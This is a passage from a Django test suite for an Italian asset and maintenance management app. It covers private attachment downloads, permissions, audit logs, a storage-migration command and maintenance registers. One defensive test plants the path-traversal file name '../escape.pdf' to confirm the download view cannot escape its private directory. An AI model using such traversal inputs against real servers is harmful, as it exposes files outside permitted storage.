            is_active=True,
        )
        upload = SimpleUploadedFile("verbale.pdf", b"%PDF-1.4 test", content_type="application/pdf")
        self.client.force_login(self.admin)

        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
            patch("assets.views.validate_extension_and_mime", return_value="application/pdf"),
        ):
            response = self.client.post(
                reverse("assets:asset_administrative_deadline_list"),
                {
                    "action": "complete_administrative_deadline",
                    "deadline_id": str(deadline.id),
                    "execution_date": "2026-04-15",
                    "execution_notes": "Verbale allegato",
                    "completion_files": upload,
                },
            )
            self.assertEqual(response.status_code, 302)
            attachment = AssetAdministrativeDeadlineCompletionAttachment.objects.get()
            self.assertTrue((Path(private_root) / attachment.file.name).exists())
            self.assertFalse((Path(media_root) / attachment.file.name).exists())

            page = self.client.get(reverse("assets:asset_administrative_deadline_list"))
            self.assertContains(
                page,
                reverse("assets:admin_deadline_attachment_download", args=[attachment.id]),
            )

            download = self.client.get(reverse("assets:admin_deadline_attachment_download", args=[attachment.id]))
            self.assertEqual(download.status_code, 200)
            self.assertEqual(download["Content-Type"], "application/pdf")
            self.assertEqual(b"".join(download.streaming_content), b"%PDF-1.4 test")
            self.assertNotContains(page, "/media/assets_admin_deadlines/")
            direct_media = self.client.get(settings.MEDIA_URL + attachment.file.name)
            self.assertIn(direct_media.status_code, {404, 302})

    def test_admin_deadline_attachment_download_requires_assets_admin(self):
        user = User.objects.create_user(username="asset-basic", password="pass12345")
        UserOnboarding.objects.update_or_create(
            user=user,
            defaults={"completed": True, "skipped": False, "completed_at": timezone.now()},
        )
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Verbale riservato",
            due_date=date(2026, 5, 15),
            is_active=True,
        )
        completion = AssetAdministrativeDeadlineCompletion.objects.create(
            deadline=deadline,
            completed_on=date(2026, 4, 15),
        )
        with _workspace_temporary_directory("assets-private-") as private_root, override_settings(ASSETS_PRIVATE_ROOT=private_root):
            attachment = AssetAdministrativeDeadlineCompletionAttachment.objects.create(
                completion=completion,
                file=SimpleUploadedFile("verbale.pdf", b"%PDF-1.4 test", content_type="application/pdf"),
                original_name="verbale.pdf",
            )
            self.client.force_login(user)
            response = self.client.get(reverse("assets:admin_deadline_attachment_download", args=[attachment.id]))
            self.assertEqual(response.status_code, 403)

    def test_admin_deadline_attachment_malicious_name_cannot_escape_private_root(self):
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Verbale nome anomalo",
            due_date=date(2026, 5, 15),
            is_active=True,
        )
        completion = AssetAdministrativeDeadlineCompletion.objects.create(
            deadline=deadline,
            completed_on=date(2026, 4, 15),
        )
        self.client.force_login(self.admin)
        with _workspace_temporary_directory("assets-private-") as private_root, override_settings(ASSETS_PRIVATE_ROOT=private_root):
            attachment = AssetAdministrativeDeadlineCompletionAttachment.objects.create(
                completion=completion,
                file=SimpleUploadedFile("safe.pdf", b"safe", content_type="application/pdf"),
                original_name="safe.pdf",
            )
            attachment.file.name = "../escape.pdf"
            attachment.save(update_fields=["file"])
            outside = Path(private_root).parent / "escape.pdf"
            outside.write_bytes(b"outside")

            response = self.client.get(reverse("assets:admin_deadline_attachment_download", args=[attachment.id]))

            self.assertEqual(response.status_code, 404)
            self.assertTrue(outside.exists())

    def test_admin_deadline_attachment_download_creates_audit_log(self):
        from core.models import AuditLog

        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Verbale audit",
            due_date=date(2026, 5, 15),
            is_active=True,
        )
        completion = AssetAdministrativeDeadlineCompletion.objects.create(
            deadline=deadline,
            completed_on=date(2026, 4, 15),
        )
        with _workspace_temporary_directory("assets-private-") as private_root, override_settings(ASSETS_PRIVATE_ROOT=private_root):
            attachment = AssetAdministrativeDeadlineCompletionAttachment.objects.create(
                completion=completion,
                file=SimpleUploadedFile("verbale-audit.pdf", b"%PDF-AUDIT", content_type="application/pdf"),
                original_name="verbale-audit.pdf",
            )
            self.client.force_login(self.admin)
            # Conta solo le righe di QUESTA azione: il totale globale e' inquinabile da
            # scritture estranee alla richiesta (es. l'auto_insert del singleton
            # twofa.TwoFactorPolicy, creato pigramente alla prima richiesta che lo tocca).
            audit_download = AuditLog.objects.filter(
                azione="download_admin_deadline_attachment", modulo="assets",
            )
            before = audit_download.count()
            response = self.client.get(reverse("assets:admin_deadline_attachment_download", args=[attachment.id]))
            self.assertEqual(response.status_code, 200)
            created = audit_download.order_by("-id").first()
            self.assertIsNotNone(created)
            self.assertEqual(audit_download.count(), before + 1)
            payload = created.dettaglio or {}
            self.assertEqual(payload.get("esito"), "success")
            self.assertEqual(payload.get("attachment_id"), attachment.id)
            self.assertEqual(payload.get("asset_id"), self.asset.id)
            serialized = repr(payload)
            self.assertNotIn(str(private_root), serialized)
            self.assertNotIn("%PDF-AUDIT", serialized)

    def test_admin_deadline_attachment_denied_creates_audit_without_path(self):
        from core.models import AuditLog

        user = User.objects.create_user(username="asset-audit-basic", password="pass12345")
        UserOnboarding.objects.update_or_create(
            user=user,
            defaults={"completed": True, "skipped": False, "completed_at": timezone.now()},
        )
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Verbale audit denied",
            due_date=date(2026, 5, 15),
            is_active=True,
        )
        completion = AssetAdministrativeDeadlineCompletion.objects.create(
            deadline=deadline,
            completed_on=date(2026, 4, 15),
        )
        with _workspace_temporary_directory("assets-private-") as private_root, override_settings(ASSETS_PRIVATE_ROOT=private_root):
            attachment = AssetAdministrativeDeadlineCompletionAttachment.objects.create(
                completion=completion,
                file=SimpleUploadedFile("riservato.pdf", b"%PDF-RISERVATO", content_type="application/pdf"),
                original_name="riservato.pdf",
            )
            self.client.force_login(user)
            response = self.client.get(reverse("assets:admin_deadline_attachment_download", args=[attachment.id]))
            self.assertEqual(response.status_code, 403)
            created = AuditLog.objects.filter(
                azione="download_admin_deadline_attachment", modulo="assets",
            ).order_by("-id").first()
            self.assertIsNotNone(created)
            payload = created.dettaglio or {}
            self.assertEqual(payload.get("esito"), "denied")
            self.assertEqual(payload.get("motivo"), "permission_denied")
            serialized = repr(payload)
            self.assertNotIn(str(private_root), serialized)
            self.assertNotIn("%PDF-RISERVATO", serialized)
            self.assertNotIn("riservato.pdf", serialized)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetAdminDeadlineAttachmentMigrationCommandTests(TestCase):
    def setUp(self):
        self.admin = User.objects.create_superuser(
            username="asset-migrate-admin",
            email="asset-migrate-admin@test.local",
            password="pass12345",
        )
        self.asset = Asset.objects.create(
            name="Centro migrazione",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_tag="MIG-001",
            source_key="asset-migrate-main",
        )
        self.deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Verbale migrazione",
            due_date=date(2026, 5, 15),
            is_active=True,
        )
        self.completion = AssetAdministrativeDeadlineCompletion.objects.create(
            deadline=self.deadline,
            completed_on=date(2026, 4, 15),
            completed_by=self.admin,
        )

    def _attachment(self, name: str) -> AssetAdministrativeDeadlineCompletionAttachment:
        return AssetAdministrativeDeadlineCompletionAttachment.objects.create(
            completion=self.completion,
            file=name,
            original_name=Path(name).name,
            uploaded_by=self.admin,
        )

    def _run_command(self, *args: str) -> str:
        stdout = io.StringIO()
        call_command("migrate_admin_deadline_attachments_private", *args, stdout=stdout)
        return stdout.getvalue()

    def test_migration_command_dry_run_does_not_copy_or_delete(self):
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
        ):
            attachment = self._attachment("assets_admin_deadlines/MIG-001/1/legacy.pdf")
            source = Path(media_root) / attachment.file.name
            source.parent.mkdir(parents=True)
            source.write_bytes(b"legacy")

            output = self._run_command()

            attachment.refresh_from_db()
            self.assertIn("DRY-RUN", output)
            self.assertTrue(source.exists())
            self.assertFalse((Path(private_root) / attachment.file.name).exists())
            self.assertEqual(attachment.file.name, "assets_admin_deadlines/MIG-001/1/legacy.pdf")

    def test_migration_command_apply_copies_to_private_root_and_normalizes_reference(self):
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
        ):
            attachment = self._attachment(r"assets_admin_deadlines\MIG-001\1\legacy.pdf")
            source = Path(media_root) / "assets_admin_deadlines" / "MIG-001" / "1" / "legacy.pdf"
            source.parent.mkdir(parents=True)
            source.write_bytes(b"legacy")

            output = self._run_command("--apply")

            attachment.refresh_from_db()
            self.assertIn("APPLY", output)
            self.assertEqual(attachment.file.name, "assets_admin_deadlines/MIG-001/1/legacy.pdf")
            self.assertEqual((Path(private_root) / attachment.file.name).read_bytes(), b"legacy")
            self.assertTrue(source.exists())

    def test_migration_command_delete_source_only_after_successful_copy(self):
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
        ):
            attachment = self._attachment("assets_admin_deadlines/MIG-001/1/delete.pdf")
            source = Path(media_root) / attachment.file.name
            source.parent.mkdir(parents=True)
            source.write_bytes(b"legacy")

            output = self._run_command("--apply", "--delete-source")

            self.assertIn("deleted=1", output)
            self.assertFalse(source.exists())
            self.assertEqual((Path(private_root) / attachment.file.name).read_bytes(), b"legacy")

    def test_migration_command_missing_source_warns_without_crashing(self):
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
        ):
            attachment = self._attachment("assets_admin_deadlines/MIG-001/1/missing.pdf")

            output = self._run_command("--apply")

            self.assertIn("sorgente mancante", output)
            self.assertIn("missing=1", output)
            self.assertFalse((Path(private_root) / attachment.file.name).exists())

    def test_migration_command_is_idempotent_when_target_already_exists(self):
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
        ):
            attachment = self._attachment("assets_admin_deadlines/MIG-001/1/done.pdf")
            source = Path(media_root) / attachment.file.name
            target = Path(private_root) / attachment.file.name
            source.parent.mkdir(parents=True)
            target.parent.mkdir(parents=True)
            source.write_bytes(b"same")
            target.write_bytes(b"same")

            output = self._run_command("--apply", "--delete-source")

            self.assertIn("skipped=1", output)
            self.assertIn("deleted=1", output)
            self.assertFalse(source.exists())
            self.assertEqual(target.read_bytes(), b"same")

    def test_migration_command_collision_keeps_source_and_target_unchanged(self):
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(MEDIA_ROOT=media_root, ASSETS_PRIVATE_ROOT=private_root),
        ):
            attachment = self._attachment("assets_admin_deadlines/MIG-001/1/collision.pdf")
            source = Path(media_root) / attachment.file.name
            target = Path(private_root) / attachment.file.name
            source.parent.mkdir(parents=True)
            target.parent.mkdir(parents=True)
            source.write_bytes(b"source")
            target.write_bytes(b"target")

            output = self._run_command("--apply", "--delete-source")

            self.assertIn("collisione target", output)
            self.assertIn("collisions=1", output)
            self.assertEqual(source.read_bytes(), b"source")
            self.assertEqual(target.read_bytes(), b"target")


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetMaintenanceRegisterTicketTests(TestCase):
    """Test per l'integrazione dei ticket MAN nel registro manutenzione asset (PATCH 21E)."""

    def setUp(self):
        super().setUp()
        self.user = get_user_model().objects.create_user(
            username="test-user",
            email="test@example.com",
            first_name="Test",
            last_name="User",
        )
        UserOnboarding.objects.update_or_create(
            user=self.user,
            defaults={
                "completed": True,
                "skipped": False,
                "completed_at": timezone.now(),
            },
        )

        # Crea asset di test
        self.asset_category = AssetCategory.objects.create(
            code="CNC",
            label="Macchine CNC",
        )
        self.asset = Asset.objects.create(
            name="Macchina CNC Test",
            asset_tag="CNC-001",
            asset_type="CNC",
            asset_category=self.asset_category,
            status="IN_USE",
        )

    def test_asset_detail_shows_man_ticket_in_maintenance_register(self):
        """Verifica che il dettaglio asset mostri i ticket MAN inclusi come manutenzione straordinaria."""
        # Crea ticket MAN incluso
        ticket = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN test",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))

        self.assertEqual(response.status_code, 200)
        # Verifica che il ticket appaia nel registro manutenzione
        self.assertContains(response, ticket.numero_ticket)
        self.assertContains(response, ticket.titolo)

    def test_asset_detail_does_not_show_excluded_man_ticket(self):
        """Verifica che il dettaglio asset non mostri i ticket MAN esclusi nel registro manutenzione."""
        # Crea ticket MAN escluso
        ticket = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN escluso",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=False,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))

        self.assertEqual(response.status_code, 200)
        # Verifica che il ticket non appaia nel registro manutenzione (sezione MANUTENZIONE)
        # Il ticket puÃ² comunque apparire nella sezione "Ticket collegati"
        from assets.services.maintenance_register import collect_asset_maintenance_register
        register = collect_asset_maintenance_register(self.asset, include_tickets=True)
        ticket_rows = [row for row in register if row["source"] == "TICKET"]
        self.assertEqual(len(ticket_rows), 0)

    def test_asset_detail_maintenance_register_preserves_workorders(self):
        """Verifica che il registro manutenzione mantenga anche le righe WorkOrder esistenti."""
        from .models import WorkOrder

        # Crea WorkOrder
        wo = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            title="WorkOrder test",
            description="Descrizione WorkOrder",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))

        self.assertEqual(response.status_code, 200)
        # Verifica che il WorkOrder appaia nel registro manutenzione
        self.assertContains(response, wo.title)

    def test_asset_detail_maintenance_register_shows_both_workorders_and_tickets(self):
        """Verifica che il registro manutenzione mostri sia WorkOrder che ticket MAN."""
        from .models import WorkOrder

        # Crea WorkOrder
        wo = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            title="WorkOrder test",
            description="Descrizione WorkOrder",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
        )

        # Crea ticket MAN incluso
        ticket = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN test",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))
        self.assertEqual(response.status_code, 200)
        # Verifica che entrambi appaiano nel registro manutenzione
        self.assertContains(response, wo.title)
        self.assertContains(response, ticket.numero_ticket)

    def test_company_maintenance_history_combines_closed_workorders_and_man_tickets(self):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            title="Sostituzione cuscinetto conclusa",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
            intervention_duration_minutes=90,
            cost_eur=Decimal("125.50"),
        )
        ticket = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Rumore anomalo risolto",
            descrizione="Segnalazione operatore",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            stato=StatoTicket.CHIUSO,
            closed_at=timezone.now(),
            asset=self.asset,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
        )
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:maintenance_history"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, workorder.title)
        self.assertContains(response, ticket.titolo)
        self.assertContains(response, "OdL")
        self.assertContains(response, "Ticket MAN")
        self.assertEqual(response.context["history_workorder_count"], 1)
        self.assertEqual(response.context["history_ticket_count"], 1)


class AssetMaintenanceRegisterUnifiedTests(TestCase):
    """Test per il registro manutenzione unificato e generazione massiva (PATCH 21A-FINAL)."""

    def setUp(self):
        super().setUp()
        self.user = get_user_model().objects.create_superuser(
            username="maintenance-user",
            email="maintenance@example.com",
            password="secret123",
        )
        UserOnboarding.objects.update_or_create(
            user=self.user,
            defaults={
                "completed": True,
                "skipped": False,
                "completed_at": timezone.now(),
            },
        )

        # Crea categoria e asset di test
        self.category = AssetCategory.objects.create(
            code="CNC-TEST",
            label="Macchine CNC Test",
        )
        self.asset1 = Asset.objects.create(
            name="Macchina CNC 1",
            asset_tag="CNC-001",
            asset_type="CNC",
            asset_category=self.category,
            status="IN_USE",
        )
        self.asset2 = Asset.objects.create(
            name="Macchina CNC 2",
            asset_tag="CNC-002",
            asset_type="CNC",
            asset_category=self.category,
            status="IN_USE",
        )
        self.asset3 = Asset.objects.create(
            name="Macchina CNC 3",
            asset_tag="CNC-003",
            asset_type="CNC",
            asset_category=self.category,
            status="IN_USE",
        )

        # Crea template e regola di manutenzione
        self.template = MaintenanceInterventionTemplate.objects.create(
            code="cambio-olio-test",
            label="Cambio olio test",
            description="Template per cambio olio",
            asset_category=self.category,
        )
        self.rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
            warning_days=15,
        )

    def test_manual_workorder_can_be_created_for_single_asset(self):
        """Verifica che sia possibile creare un WorkOrder manuale per un singolo asset."""
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset1.id]),
            {
                "periodic_verification": "",
                "supplier": "",
                "kind": WorkOrder.KIND_CORRECTIVE,
                "status": WorkOrder.STATUS_OPEN,
                "origin": WorkOrder.ORIGIN_MANUAL,
                "title": "Manutenzione manuale test",
                "description": "Descrizione manutenzione manuale",
                "resolution": "",
                "downtime_minutes": "0",
                "cost_eur": "",
            },
        )

        self.assertEqual(response.status_code, 302)  # Redirect dopo creazione
        wo = WorkOrder.objects.filter(asset=self.asset1, origin=WorkOrder.ORIGIN_MANUAL).first()
        self.assertIsNotNone(wo)
        self.assertEqual(wo.title, "Manutenzione manuale test")
        self.assertEqual(wo.kind, WorkOrder.KIND_CORRECTIVE)
        self.assertEqual(wo.status, WorkOrder.STATUS_OPEN)

    def test_manual_workorder_appears_in_asset_maintenance_register(self):
        """Verifica che un WorkOrder manuale appaia nel registro manutenzione dell'asset."""
        # Crea WorkOrder manuale
        wo = WorkOrder.objects.create(
            asset=self.asset1,
            kind=WorkOrder.KIND_CORRECTIVE,
            origin=WorkOrder.ORIGIN_MANUAL,
            title="Manutenzione manuale",
            description="Test",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset1.id}))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, wo.title)

    def test_periodic_rule_generation_creates_workorder_per_asset(self):
        """Verifica che la generazione da regola crei un WorkOrder per ogni asset."""
        from assets.services import generate_workorders_for_rule

        created = generate_workorders_for_rule(self.rule, user=self.user)

        self.assertEqual(len(created), 3)  # 3 asset nella categoria

        # Verifica che ogni asset abbia un WorkOrder
        for asset in [self.asset1, self.asset2, self.asset3]:
            wo = WorkOrder.objects.filter(
                asset=asset,
                maintenance_rule=self.rule,
                origin=WorkOrder.ORIGIN_PERIODIC,
            ).first()
            self.assertIsNotNone(wo)
            self.assertEqual(wo.kind, WorkOrder.KIND_PREVENTIVE)
            self.assertEqual(wo.status, WorkOrder.STATUS_OPEN)

    def test_periodic_rule_generation_uses_reference_batch(self):
        """Verifica che la generazione da regola usi un reference_batch comune."""
        from assets.services import generate_workorders_for_rule

        created = generate_workorders_for_rule(self.rule, user=self.user)

        self.assertEqual(len(created), 3)

        # Tutti i WorkOrder devono avere lo stesso reference_batch
        reference_batches = {wo.reference_batch for wo in created}
        self.assertEqual(len(reference_batches), 1)
        batch = reference_batches.pop()
        self.assertTrue(batch.startswith("BATCH_"))
        self.assertIn(str(self.rule.id), batch)

    def test_periodic_rule_generation_does_not_create_cross_asset_single_record(self):
        """Verifica che la generazione non crei un singolo record cross-asset."""
        from assets.services import generate_workorders_for_rule

        created = generate_workorders_for_rule(self.rule, user=self.user)

        self.assertEqual(len(created), 3)

        # Ogni WorkOrder deve essere associato a un asset specifico
        asset_ids = {wo.asset_id for wo in created}
        self.assertEqual(len(asset_ids), 3)
        self.assertIn(self.asset1.id, asset_ids)
        self.assertIn(self.asset2.id, asset_ids)
        self.assertIn(self.asset3.id, asset_ids)

    def test_workorder_report_attachment_upload(self):
        """Verifica che sia possibile caricare un allegato rapportino a un WorkOrder."""
        wo = WorkOrder.objects.create(
            asset=self.asset1,
            kind=WorkOrder.KIND_CORRECTIVE,
            title="Intervento con allegato",
            status=WorkOrder.STATUS_OPEN,
        )

        upload = SimpleUploadedFile("report.pdf", b"%PDF-1.4 test", content_type="application/pdf")

        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-wo-attachments-") as media_root, override_settings(MEDIA_ROOT=media_root):
            with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                response = self.client.post(
                    reverse("assets:wo_create", args=[self.asset1.id]),
                    {
                        "periodic_verification": "",
                        "supplier": "",
                        "kind": WorkOrder.KIND_CORRECTIVE,
                        "status": WorkOrder.STATUS_OPEN,
                        "title": "Intervento con allegato",
                        "description": "Test",
                        "downtime_minutes": "0",
                        "attachments": upload,
                    },
                )

        self.assertEqual(response.status_code, 302)
        # Verifica che l'allegato sia stato creato
        attachment = WorkOrderAttachment.objects.filter(work_order__asset=self.asset1).first()
        self.assertIsNotNone(attachment)
        self.assertTrue(attachment.file.name.endswith(".pdf"))

    def test_workorder_report_attachment_visible_on_asset_detail(self):
        """Verifica che gli allegati WorkOrder siano visibili nel dettaglio asset."""
        wo = WorkOrder.objects.create(
            asset=self.asset1,
            kind=WorkOrder.KIND_CORRECTIVE,
            title="Intervento con allegato",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
        )

        # Crea allegato
        attachment = WorkOrderAttachment.objects.create(
            work_order=wo,
            file=SimpleUploadedFile("report.pdf", b"%PDF-1.4 test", content_type="application/pdf"),
            original_name="report.pdf",
            uploaded_by=self.user,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset1.id}))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, wo.title)

    def test_unified_register_contains_periodic_manual_and_ticket_rows(self):
        """Verifica che il registro unificato contenga righe PERIODIC, MANUAL e TICKET."""
        from assets.services import collect_asset_maintenance_register

        # Crea WorkOrder periodico
        wo_periodic = WorkOrder.objects.create(
            asset=self.asset1,
            maintenance_rule=self.rule,
            origin=WorkOrder.ORIGIN_PERIODIC,
            kind=WorkOrder.KIND_PREVENTIVE,
            title="Manutenzione periodica",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
        )

        # Crea WorkOrder manuale
        wo_manual = WorkOrder.objects.create(
            asset=self.asset1,
            origin=WorkOrder.ORIGIN_MANUAL,
            kind=WorkOrder.KIND_CORRECTIVE,
            title="Manutenzione manuale",
            status=WorkOrder.STATUS_DONE,
            closed_at=timezone.now(),
        )

        # Crea ticket MAN incluso
        ticket = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN test",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset1,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
            stato=StatoTicket.CHIUSO,
            closed_at=timezone.now(),
        )

        # Raccogli registro
        register = collect_asset_maintenance_register(self.asset1, include_tickets=True)

        self.assertEqual(len(register), 3)

        sources = {row["source"] for row in register}
        self.assertIn("WORKORDER", sources)
        self.assertIn("TICKET", sources)

        # Verifica che ci siano entrambi i WorkOrder
        wo_rows = [row for row in register if row["source"] == "WORKORDER"]
        self.assertEqual(len(wo_rows), 2)

        # Verifica che ci sia il ticket
        ticket_rows = [row for row in register if row["source"] == "TICKET"]
        self.assertEqual(len(ticket_rows), 1)

    def test_ticket_it_not_in_unified_register(self):
        """Verifica che i ticket IT non siano inclusi nel registro unificato."""
        from assets.services import collect_asset_maintenance_register

        # Crea ticket IT
        ticket_it = Ticket.objects.create(
            tipo=TipoTicket.IT,
            titolo="Ticket IT test",
            descrizione="Descrizione test",
            categoria="SOFTWARE",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset1,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
        )

        # Crea ticket MAN
        ticket_man = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN test",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset1,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
        )

        register = collect_asset_maintenance_register(self.asset1, include_tickets=True)

        # Solo il ticket MAN deve essere presente
        self.assertEqual(len(register), 1)
        self.assertEqual(register[0]["source"], "TICKET")
        self.assertEqual(register[0]["ticket"].id, ticket_man.id)

    def test_ticket_man_excluded_flag_not_in_unified_register(self):
        """Verifica che i ticket MAN con flag exclude non siano nel registro unificato."""
        from assets.services import collect_asset_maintenance_register

        # Crea ticket MAN incluso
        ticket_included = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN incluso",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset1,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=True,
        )

        # Crea ticket MAN escluso
        ticket_excluded = Ticket.objects.create(
            tipo=TipoTicket.MAN,
            titolo="Ticket MAN escluso",
            descrizione="Descrizione test",
            categoria="MECCANICA",
            priorita=PrioritaTicket.MEDIA,
            asset=self.asset1,
            richiedente_nome="Test User",
            richiedente_email="test@example.com",
            include_in_maintenance_register=False,
        )

        register = collect_asset_maintenance_register(self.asset1, include_tickets=True)

        # Solo il ticket incluso deve essere presente
        self.assertEqual(len(register), 1)
        self.assertEqual(register[0]["ticket"].id, ticket_included.id)


class ClassifyAssetTypeTests(TestCase):
    """Euristica di classificazione tipo asset dal nome categoria."""

    def test_keyword_mapping(self):
        from assets.services.asset_catalog_import import classify_asset_type

        cases = {
            "PC Ufficio": Asset.TYPE_PC,
            "Portatili": Asset.TYPE_NOTEBOOK,
            "Server di dominio": Asset.TYPE_SERVER,
            "Macchina virtuale": Asset.TYPE_VM,
            "Firewall perimetrale": Asset.TYPE_FIREWALL,
            "Apparati di rete": Asset.TYPE_FIREWALL,
            "Stampanti multifunzione": Asset.TYPE_STAMPANTE,
            "Videosorveglianza TVCC": Asset.TYPE_CCTV,
            "Fonia": Asset.TYPE_FONIA,
            "Carroponti": Asset.TYPE_CARROPONTE,
            "Macchine CNC": Asset.TYPE_CNC,
            "Macchine utensili": Asset.TYPE_WORK_MACHINE,
            "Prodotti Chimici": Asset.TYPE_CHEMICAL,
            "Prodotto chimico": Asset.TYPE_CHEMICAL,
            "Bruciatori": Asset.TYPE_OTHER,
            "": Asset.TYPE_OTHER,
        }
        for label, expected in cases.items():
            self.assertEqual(classify_asset_type(label), expected, label)


class RealignAssetTypesCommandTests(TestCase):
    """Command realign_asset_types: riallineamento tipo asset da categoria."""

    def test_realign_from_category(self):
        pc_cat = AssetCategory.objects.create(
            code="pc-ufficio", label="PC Ufficio", base_asset_type=Asset.TYPE_OTHER
        )
        burner_cat = AssetCategory.objects.create(
            code="bruciatori", label="Bruciatori", base_asset_type=Asset.TYPE_OTHER
        )
        pc = Asset.objects.create(asset_tag="IT-000001", name="PC test", asset_type=Asset.TYPE_OTHER, asset_category=pc_cat)
        burner = Asset.objects.create(asset_tag="AST-000001", name="Bruciatore", asset_type=Asset.TYPE_OTHER, asset_category=burner_cat)
        orphan = Asset.objects.create(asset_tag="AST-000002", name="Senza categoria", asset_type=Asset.TYPE_OTHER)

        call_command("realign_asset_types", stdout=io.StringIO())

        pc_cat.refresh_from_db()
        burner_cat.refresh_from_db()
        pc.refresh_from_db()
        burner.refresh_from_db()
        orphan.refresh_from_db()
        # La categoria "PC Ufficio" viene tipizzata e l'asset allineato.
        self.assertEqual(pc_cat.base_asset_type, Asset.TYPE_PC)
        self.assertEqual(pc.asset_type, Asset.TYPE_PC)
        # "Bruciatori" resta OTHER (mai declassata, nessun keyword).
